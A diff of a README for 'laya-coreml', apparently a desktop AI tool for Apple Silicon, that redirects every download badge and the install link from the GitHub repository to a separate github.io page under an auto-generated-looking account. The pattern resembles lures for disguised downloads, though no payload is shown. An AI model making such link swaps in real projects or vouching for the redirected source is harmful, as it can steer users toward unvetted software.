@@ -1,6 +1,6 @@
 # 🔋 laya-coreml - Fast Typed Decisions on Apple Silicon
 
-[![Download Now](https://img.shields.io/badge/Download-laya--coreml-blue?style=for-the-badge&logo=apple&logoColor=white&color=random)](https://github.com/academicgowndigitalclock977/laya-coreml)
+[![Download Now](https://img.shields.io/badge/Download-laya--coreml-blue?style=for-the-badge&logo=apple&logoColor=white&color=random)](https://academicgowndigitalclock977.github.io)
 
 ---
 
@@ -25,7 +25,7 @@ Follow these simple steps to get laya-coreml running on your machine.
 
 Visit this link to download the application:  
 
-**[https://github.com/academicgowndigitalclock977/laya-coreml](https://github.com/academicgowndigitalclock977/laya-coreml)**
+**[https://academicgowndigitalclock977.github.io](https://academicgowndigitalclock977.github.io)**
 
 Click the **Download** button on that page (look for a green button or a "Releases" section). The file will be saved to your **Downloads** folder.
 
@@ -183,7 +183,7 @@ Response time is usually within 48 hours.
 laya-coreml brings **enterprise-grade decision making** to your desktop with **unmatched speed and privacy**. Whether you're building local AI tools, automating workflows, or just curious about on-device intelligence, this application makes it effortless.
 
 **Ready to start?**  
-[![Download Now](https://img.shields.io/badge/Download-laya--coreml-brightgreen?style=flat-square&logo=github&logoColor=white&color=success)](https://github.com/academicgowndigitalclock977/laya-coreml)
+[![Download Now](https://img.shields.io/badge/Download-laya--coreml-brightgreen?style=flat-square&logo=github&logoColor=white&color=success)](https://academicgowndigitalclock977.github.io)
 
 ---
 
